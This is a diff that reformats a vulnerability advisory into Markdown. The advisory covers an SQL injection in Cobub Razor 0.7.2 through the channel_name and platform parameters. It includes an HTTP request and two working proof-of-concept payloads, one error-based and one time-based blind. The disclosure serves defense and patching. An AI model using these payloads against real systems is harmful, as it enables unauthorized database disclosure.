@@ -1,4 +1,5 @@
-An SQL Injection vulnerability exists in Western Bridge Cobub Razor 0.7.2 via the channel_name and platform parameter in a /index.php?/manage/channel/addchannel request.
+
+## An SQL Injection vulnerability exists in Western Bridge Cobub Razor 0.7.2 via the channel_name and platform parameter in a /index.php?/manage/channel/addchannel request. ##  
 
 Vendor Homepage : http://www.cobub.com/
 
@@ -6,12 +7,14 @@ Software Link : https://github.com/cobub/razor/releases
 
 Affected Version : <= 0.8.0
 
-Vulnerability description
+## Vulnerability description ##  
+
 The string  of the 'channel_name' and 'platform' parameter transmission is completely without check and filter,so if the string is passed, it will lead to the existence of SQL injection vulnerability,This could result in full information disclosure.
 
-Code source:
-/application/controllers/manage/channel.php at line 75-95
+Code source:  
 
+/application/controllers/manage/channel.php at line 75-95
+```
     /**
      * Addchannel add custom channel
      *
@@ -33,9 +36,9 @@ Code source:
             }
         }
     }
-
-Technical details
-
+```
+## Technical details ##
+```
 request:
 POST /index.php?/manage/channel/addchannel HTTP/1.1
 Host: localhost
@@ -53,12 +56,15 @@ X-Forwarded-For: 8.8.8.8
 Connection: close
 
 channel_name=test&platform=1%22
+```  
 
-Proof of Concept
+## Proof of Concept ##  
+
 The SQL injection type: error-based and AND/OR time-based blind
 Parameter: channel_name,platform
 
-Payload(This string is also applied to 'platform' at the same time):
+Payload(This string is also applied to 'platform' at the same time):  
+```
 1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
 2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1
-
+```
